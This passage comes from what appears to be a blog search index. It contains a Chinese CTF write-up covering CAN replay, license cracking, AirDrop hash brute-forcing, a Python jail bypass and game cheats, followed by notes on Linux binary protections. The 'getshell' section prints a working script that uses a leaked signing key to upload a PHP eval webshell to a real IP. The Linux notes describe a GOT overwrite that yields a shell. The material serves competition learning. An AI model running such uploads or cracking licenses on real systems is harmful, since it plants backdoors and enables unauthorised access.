href="#飞驰人生" class="headerlink" title="飞驰人生"></a>飞驰人生</h2><p>前置知识<br><code>[https://www.anquanke.com/post/id/106409?from=timeline#h2-1](https://www.anquanke.com/post/id/106409?from=timeline#h2-1)</code><br>CAN报文分析，使用重放攻击解题<br><code>[http://www.hackdig.com/09/hack-771228.htm](http://www.hackdig.com/09/hack-771228.htm)</code><br>需要去GitHub下载最新版can-utils才能实现挨个手调<br><code>[GitHub - linux-can/can-utils: Linux-CAN / SocketCAN user space applications](https://github.com/linux-can/can-utils)</code><br>查看日志 将异常流量提取出来可以更快的调试完毕<br>直接筛选244#（油门流量）的异常流量去进行手调<br><code>./canplayer -I ./xxx.txt -v -i</code>逐行调试命令<br><img src="/mdimg/2022PWNHUB/1671280983003.png"><br><img src="/mdimg/2022PWNHUB/1671281025564.png"><br>表盘在此发生突变所以报文异常为<code>244#000000A60000</code><br>结合一道国外CAN报文题目可以得知<code>19B#00000F000000</code>为门锁攻击异常流量<br><img src="/mdimg/2022PWNHUB/1671353189895.png"><br>没想到直接交就对了 还没来得及对门锁流量进行调试  还需要对can-utils源码进行更深入学习才行 太菜了<br><code>flag&#123;19B#00000F000000_244#000000A60000&#125;</code></p><h2 id="证书里也有秘密"><a href="#证书里也有秘密" class="headerlink" title="证书里也有秘密"></a>证书里也有秘密</h2><p>使用 -h 查看帮助</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> &gt; .\xray<span class="hljs-literal">-cracker</span> <span class="hljs-literal">-h</span><br>破解xray高级版证书，使用 <span class="hljs-literal">-h</span> 参数查看使用帮助<br><br>Usage of xray<span class="hljs-literal">-cracker</span>:<br><span class="hljs-literal">-c</span> string<br>替换xray程序内置公钥，需要指定xray程序文件路径<br><span class="hljs-literal">-g</span> string<br>生成一个永久license，需要指定用户名<br><span class="hljs-literal">-p</span> string<br>解析官方证书，需要指定证书路径<br><br></code></pre></td></tr></table></figure><p>使用<code>.\xray-cracker -p xray-license.lic</code>查看即可<br><code>flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;</code></p><h2 id="空投之王"><a href="#空投之王" class="headerlink" title="空投之王"></a>空投之王</h2><p>下载附件后一眼Airdrop取证（小姐姐好看捏）  感谢Qsugar师傅送的盘古石<br>导入日志文件<br><img src="/mdimg/2022PWNHUB/6bccea041523f122f7dff78a999130d.png"><br>利用盘古石 Airdrop 哈希转换工具得到手机号码<br><img src="/mdimg/2022PWNHUB/11481d495e07b31136a6cb8af72db65.png"><code>flag&#123;18800009527&#125;</code><br>爆破脚本 爆破速度感人</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>targetstart = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash start fragment: &#x27;</span>)<br>targetend = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash end fragment: &#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Checking all Chinese areacode&#x27;</span>)<br>areacodelist = [<span class="hljs-string">&#x27;139&#x27;</span>, <span class="hljs-string">&#x27;138&#x27;</span>, <span class="hljs-string">&#x27;137&#x27;</span>, <span class="hljs-string">&#x27;136&#x27;</span>, <span class="hljs-string">&#x27;135&#x27;</span>, <span class="hljs-string">&#x27;134&#x27;</span>, <span class="hljs-string">&#x27;159&#x27;</span>, <span class="hljs-string">&#x27;158&#x27;</span>,<span class="hljs-string">&#x27;157&#x27;</span>,<span class="hljs-string">&#x27;150&#x27;</span>,<span class="hljs-string">&#x27;151&#x27;</span>, <span class="hljs-string">&#x27;152&#x27;</span>, <span class="hljs-string">&#x27;188&#x27;</span>, <span class="hljs-string">&#x27;187&#x27;</span>, <span class="hljs-string">&#x27;182&#x27;</span>, <span class="hljs-string">&#x27;183&#x27;</span>, <span class="hljs-string">&#x27;184&#x27;</span>, <span class="hljs-string">&#x27;178&#x27;</span>]<br>phonematch = []<br><br><span class="hljs-keyword">for</span> areacode <span class="hljs-keyword">in</span> areacodelist:<br>    line = <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Searching area code &#x27;</span> + areacode + <span class="hljs-string">&#x27; for target...&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) &lt; <span class="hljs-number">100000000</span>:<br>        targetphone = <span class="hljs-string">&#x27;86&#x27;</span> + <span class="hljs-built_in">str</span>(areacode) + <span class="hljs-built_in">str</span>(line).zfill(<span class="hljs-number">8</span>)<br>        targettest = hashlib.sha256(targetphone.encode())<br>        starthashcheck = targettest.hexdigest() [<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]<br>        endhashcheck = targettest.hexdigest() [-<span class="hljs-number">5</span>:]<br>        <span class="hljs-keyword">if</span> starthashcheck == targetstart.lower() <span class="hljs-keyword">and</span> endhashcheck ==targetend.lower():<br>            phonematch.append(targetphone)<br>            <span class="hljs-built_in">print</span>(targetphone + <span class="hljs-string">&#x27; matches hash fragments. Stillchecking...&#x27;</span>)<br>        line = <span class="hljs-built_in">int</span>(line) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) == <span class="hljs-number">100000000</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span> phonematch:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your target\&#x27;s phone number may be:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> phonematch:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Target phone number not found in this area code set. Targetphone may use another country code.&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="坐井观天"><a href="#坐井观天" class="headerlink" title="坐井观天"></a>坐井观天</h2><p>可以使⽤的字符有``string.ascii_letters + string.digits + “,!?;#+-/$@&amp;|~^&lt;&gt;(){}”<code> 这些⽅法</code>“getattr”, “exec”, “open”, “<strong>builtins</strong>“, “<strong>build_class</strong>“, “<strong>loader</strong>“, “<strong>spec</strong>“<code>都被 禁⽤了，那么这个时候可以选择⽤</code>chr()<code>来绕过，当然也可以⽤</code>eval(input())`绕过。<br><img src="/mdimg/2022PWNHUB/1671287243843.png"><br><img src="/mdimg/2022PWNHUB/1671589681536.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="justJS"><a href="#justJS" class="headerlink" title="justJS"></a>justJS</h2><p>非预期了。。。<br><img src="/mdimg/2022PWNHUB/1671280829207.png"></p><h1 id="GAMING"><a href="#GAMING" class="headerlink" title="GAMING"></a>GAMING</h1><h2 id="游戏来咯"><a href="#游戏来咯" class="headerlink" title="游戏来咯"></a>游戏来咯</h2><p>注册账号登录即可get flag</p><h2 id="攻城拔寨"><a href="#攻城拔寨" class="headerlink" title="攻城拔寨"></a>攻城拔寨</h2><p>修改器直接改<br><img src="/mdimg/2022PWNHUB/1.png"><br>将官职修改到督邮以上<br><img src="/mdimg/2022PWNHUB/2.png"><br>重新登陆，查看邮箱<br><img src="/mdimg/2022PWNHUB/3.png"></p><h2 id="特殊玩家"><a href="#特殊玩家" class="headerlink" title="特殊玩家"></a>特殊玩家</h2><p><img src="/mdimg/2022PWNHUB/4.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>打开附件在<code>APMServ5.2.6&gt;www&gt;htdocs&gt;server&gt;game&gt;BattleNetGateway.php</code><br>可以看到存在漏洞，可以上传文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php   <br>require_once(<span class="hljs-string">&quot;interface.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;utils.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;HeroFunc.php&quot;</span>);<br>require_once(<span class="hljs-string">&quot;BattleNetServices.php&quot;</span>);<br>define(<span class="hljs-string">&quot;BATTLE_NET_KEY&quot;</span>,<span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span>);<br><span class="hljs-keyword">if</span> (!defined(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>)) &#123;<span class="hljs-keyword">if</span> (substr(PHP_OS, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) == <span class="hljs-string">&#x27;WIN&#x27;</span>) define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>); <span class="hljs-keyword">else</span> define(<span class="hljs-string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>);&#125; <br>ini_set(<span class="hljs-string">&#x27;include_path&#x27;</span>,ini_get(<span class="hljs-string">&#x27;include_path&#x27;</span>).PATH_SEPARATOR.realpath(<span class="hljs-string">&quot;../&quot;</span>));     <br><br>$param=$_POST;<br><span class="hljs-keyword">if</span>(empty($param))$param=$_GET;      <br>$from_uid=$param[<span class="hljs-string">&quot;from_uid&quot;</span>];   <br>$sign=$param[<span class="hljs-string">&quot;sign&quot;</span>];<br>$commandFunc=$param[<span class="hljs-string">&quot;commandFunc&quot;</span>];<br>$content=urldecode($param[<span class="hljs-string">&quot;content&quot;</span>]);<br>$content_encoding=$param[<span class="hljs-string">&quot;content-encoding&quot;</span>];<br>//$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY;<br><br><br><br>$ret=array();<br><span class="hljs-keyword">if</span>($sign!=md5($from_uid.$commandFunc.$content.BATTLE_NET_KEY)) <br>$ret[]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">else</span>&#123;<br>    $ret[]=<span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>    <span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br>$inputParams=explode(<span class="hljs-string">&quot;|&quot;</span>,$content);<br><span class="hljs-keyword">if</span>(count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=$inputParams[<span class="hljs-number">0</span>];<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    $inputParams=json_decode($content,true);<br><span class="hljs-keyword">if</span>(is_array($inputParams)&amp;&amp;count($inputParams)==<span class="hljs-number">1</span>)&#123;<br>    $inputParams=array_shift($inputParams);<br>&#125;<br>$ret[]=$commandFunc($from_uid,$inputParams); <br>&#125;<br>&#125;catch(Exception $e)&#123;<br>    $ret = array(<span class="hljs-number">0</span>=&gt;<span class="hljs-number">0</span>);<br>$ret[] = $e-&gt;getMessage();<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>($content_encoding==<span class="hljs-string">&quot;csv&quot;</span>)&#123;<br><span class="hljs-built_in">print</span> implode(<span class="hljs-string">&quot;|&quot;</span>,$ret);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-built_in">print</span> json_encode($ret);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>看到密钥</p><p><code>define(&quot;BATTLE_NET_KEY&quot;,&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;);</code><br>上传一个木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> sys<br><br>BATTLE_NET_KEY = <span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span> //key<br>data = &#123;<br>    <span class="hljs-string">&quot;from_uid&quot;</span>: <span class="hljs-string">&quot;a.php&quot;</span>,<br>    <span class="hljs-string">&quot;commandFunc&quot;</span>: <span class="hljs-string">&quot;file_put_contents&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&#x27;&lt;? eval($_POST[&#x27;</span>a<span class="hljs-string">&#x27;]);&#x27;</span>,  //一句话<br>    <span class="hljs-string">&quot;content-encoding&quot;</span>: <span class="hljs-string">&quot;csv&quot;</span><br>&#125;<br>data[<span class="hljs-string">&quot;sign&quot;</span>] = hashlib.md5((data[<span class="hljs-string">&quot;from_uid&quot;</span>]+data[<span class="hljs-string">&quot;commandFunc&quot;</span>]+data[<span class="hljs-string">&quot;content&quot;</span>]+BATTLE_NET_KEY).encode()).hexdigest()<br>t=requests.post(<span class="hljs-string">&quot;http://120.55.42.64:81/server/game/BattleNetGateway.php&quot;</span>, data=data)<br><span class="hljs-built_in">print</span>(t.text)<br></code></pre></td></tr></table></figure><p>蚁剑连接，flag在根目录下<br><img src="/mdimg/2022PWNHUB/5.jpeg"></p><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="Tcp-Show"><a href="#Tcp-Show" class="headerlink" title="Tcp Show"></a>Tcp Show</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><br>n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    d, rawdata = <span class="hljs-built_in">input</span>().strip().split()<br>    data = base64.b64decode(rawdata.encode())<br>    now = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">8</span><br>        now += <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) + <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                now += <span class="hljs-built_in">hex</span>(data[i + j])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">3</span><br>        now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                tmp = data[i + j]<br>                <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= tmp &lt;= <span class="hljs-number">126</span>:<br>                    now += <span class="hljs-built_in">chr</span>(tmp)<br>                <span class="hljs-keyword">else</span>:<br>                    now += <span class="hljs-string">&#x27;.&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>        now += <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-built_in">print</span>(now[:-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="垃圾邮件分析"><a href="#垃圾邮件分析" class="headerlink" title="垃圾邮件分析"></a>垃圾邮件分析</h2><p>爆破sha256脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-string">&#x27;sha256(vKyd2tRZFtkExhiNlPlVTduEqY47 + xxxx) = 4a39288b21b34650b177bdc58c416b3f55305945a9cf87f4bd7b4da2569c10e4&#x27;</span><br>suffix = data.split(<span class="hljs-string">&quot;(&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot; +&quot;</span>)[<span class="hljs-number">0</span>]<br>digest = data.split(<span class="hljs-string">&quot;= &quot;</span>)[<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA256<br><span class="hljs-keyword">import</span> itertools<br><br>ALPHABET = string.ascii_letters + string.digits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getProof</span>(<span class="hljs-params">suffix,digest</span>):   <br><br>    <span class="hljs-comment">#print(f&quot;suffix: &#123;suffix&#125;\ndigest: &#123;digest&#125;&quot;)</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(ALPHABET,repeat=<span class="hljs-number">4</span>):<br>        prefix = <span class="hljs-string">&#x27;&#x27;</span>.join(i)<br>        guess =  suffix + prefix<br>        <span class="hljs-keyword">if</span> sha256(guess.encode()).hexdigest() == digest:<br>            <span class="hljs-comment">#print(f&quot;Find X<span class="hljs-doctag">XXX:</span> &#123;prefix&#125;&quot;)</span><br>            <span class="hljs-keyword">return</span> prefix<br>            <span class="hljs-keyword">break</span><br><br>x = getProof(suffix,digest)<br><span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure><p>给50条数据来训练AI，然后给10条邮件让判断是垃圾邮件还是好的邮件<br>不会机器学习，纯靠翻译自己去判断，10条全对就拿到flag了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux保护机制</title>
    <link href="/2023/02/04/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DLinux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/02/04/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DLinux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>数据不可执行。原理是将数据所在内存页标识为不可执行，防止因为程序运行出现溢出而使得攻击者的shellcode可能会在数据区尝试执行的情况。NX在咱屡战屡败的经典栈溢出实验中有接触过，NX是对栈和堆的一种保护机制。实验需要关闭NX和地址随机化，否则执行shellcode时，CPU就会抛出异常，而不是去执行恶意指令。<br>Linux系统叫做NX，Windows系统中类似的机制叫DEP(Data Execute Prevention)。</p><h2 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h2><p>栈保护。栈溢出保护是一种缓冲区溢出攻击缓解手段。启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。<br>简单来说就是通过验证cookie，来判断执行的代码是不是恶意代码。</p><h2 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE / ASLR"></a>PIE / ASLR</h2><p>地址随机化。就是保证同一个程序任意两次运行时的堆栈基址是不同的。如果堆栈基址不变会怎样？不变就可能被攻击，因为攻击者能确认程序的内存地址，然后通过覆盖返回地址在等手段执行恶意代码。咱屡战屡败的经典栈溢出实验就是通过覆盖返回地址执行恶意代码。</p><table><thead><tr><th></th><th>随机化段</th><th>设置</th></tr></thead><tbody><tr><td>ADLR</td><td>堆、栈、mmap（libc库）、VDSO page</td><td>由操作系统设置</td></tr><tr><td>PIE</td><td>数据段、代码段</td><td>由编译器设置</td></tr></tbody></table><h2 id="Relro"><a href="#Relro" class="headerlink" title="Relro"></a>Relro</h2><p>只读重定位。设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT攻击。在Linux中有”Partial RELRO” “Full RELRO”两种模式，默认开启Partical RELRO，开启Partical RELRO时，GOT是可写的，开启 FULL RELRO 时，GOT表是只读的。<br> 主要用来保护重定位表段对应数据区域，默认可写 </p><ol><li>Partial RELRO： got表不可写，got.plt可写 </li><li>Full RELRO： got表，got.plt不可写  </li></ol><p>部分RELRO 易受到攻击，例如攻击者可以<strong>atoi.got为system.plt，进而输入/bin/sh\x00获得shell</strong><br>完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。<br>参考：</p><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>在编译的时候检查源码是否存在缓冲区溢出等错误。<br>简单地说，加了这个保护之后,一些敏感函数如read, fgets,memcpy, printf等等可能导致漏洞出现的函数都会被替换成__read_chk,__fgets_chk, __memcpy_chk, __printf_chk等。<br>这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，通过检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。</p><h2 id="BRATH"><a href="#BRATH" class="headerlink" title="BRATH"></a>BRATH</h2><p>程序运行时的环境变量，运行时所需要的共享库文件优先从该目录寻找，可以fake lib造成攻击。</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
